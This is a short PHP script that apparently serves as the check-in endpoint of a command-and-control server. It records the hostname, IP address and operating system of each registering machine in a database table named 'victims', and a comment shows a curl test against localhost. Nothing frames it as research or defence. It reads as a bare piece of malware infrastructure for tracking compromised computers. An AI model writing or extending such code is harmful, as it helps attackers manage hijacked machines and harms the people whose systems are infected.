<?php
// curl -d "hostname=RegisterTest&ip=127.0.0.1&os=win" -X POST http://localhost/register.php

include "conn.php";
if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["os"])){
  $registerQuery = $mysql->prepare("insert into victims(hostname, ip, os) values(?,?,?)");
  $registerQuery->bind_param("sss", $_POST["hostname"], $_POST["ip"], $_POST["os"]);
  $registerQuery->execute();
}

 ?>
